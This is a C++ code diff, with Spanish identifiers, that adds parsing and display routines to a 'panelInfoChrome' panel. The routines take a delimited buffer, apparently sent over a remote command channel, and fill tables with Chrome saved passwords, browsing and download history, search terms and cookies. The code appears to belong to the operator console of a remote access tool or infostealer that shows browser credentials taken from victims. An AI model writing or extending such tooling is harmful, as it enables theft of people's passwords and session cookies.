@@ -184,6 +184,19 @@ void panelInfoChrome::m_InsertarColumnas(std::vector<ColumnData>& columns, wxLis
 	}
 }
 
+void panelInfoChrome::m_InsertarDatos(const std::vector<std::vector<std::string>>& rows, wxListCtrl*& list_ctrl) {
+	if (list_ctrl && rows.size() > 0) {
+		int iCount = 0;
+		for (auto& item : rows) {
+			list_ctrl->InsertItem(iCount, item[0]);
+			for (int index = 1; index < item.size(); index++) {
+				list_ctrl->SetItem(iCount, index, item[index]);
+			}
+			iCount++;
+		}
+	}
+}
+
 void panelInfoChrome::m_AgregarDataPerfiles(const std::string& strBuffer) {
 	std::vector<std::string> vcProfiles = strSplit(strBuffer, CMD_DEL, 100);
 	if (vcProfiles.size() > 0) {
@@ -208,5 +221,52 @@ void panelInfoChrome::m_AgregarDataPerfiles(const std::string& strBuffer) {
 }
 
 void panelInfoChrome::m_ProcesarInfoPerfil(const std::string& strBuffer) {
-	DEBUG_MSG(strBuffer);
+	std::vector<std::string> vcData = strSplit(strBuffer, CMD_DEL, 1);
+	size_t nSize = vcData[0].size() + 1;
+	std::string strData = strBuffer.substr(nSize, strBuffer.size() - nSize);
+
+	wxListCtrl* list_ctrl = nullptr;
+	int iColumn_Count = 0;
+
+	switch (vcData[0][0]) {
+		case '1':
+			//passwords
+			iColumn_Count = 4;
+			list_ctrl = this->listCtrlPasswords;
+			break;
+		case '2':
+			//Historial navegavion
+			iColumn_Count = 4;
+			list_ctrl = this->listCtrlHistorialN;
+			break;
+		case '3':
+			//Historial descargas
+			iColumn_Count = 5;
+			list_ctrl = this->listCtrlHistorialD;
+			break;
+		case '4':
+			//Historial busqueda
+			iColumn_Count = 1;
+			list_ctrl = this->listCtrlSearchT;
+			break;
+		case '5':
+			//Cookies
+			iColumn_Count = 8;
+			list_ctrl = this->listCtrlCookies;
+			break;
+		default:
+			DEBUG_MSG("No se pudo parsear los datos ::" + strBuffer);
+			break;
+	}
+
+	if (iColumn_Count != 0) {
+		std::vector<std::vector<std::string>> vcData;
+		std::vector<std::string> vcRow = strSplit(strData, strDelim1, 10000);
+		for (std::string& strSubItem : vcRow) {
+			std::vector<std::string> vc_row = strSplit(strSubItem, strDelim2, iColumn_Count);
+			vcData.push_back(vc_row);
+		}
+
+		this->m_InsertarDatos(vcData, list_ctrl);
+	}
 }
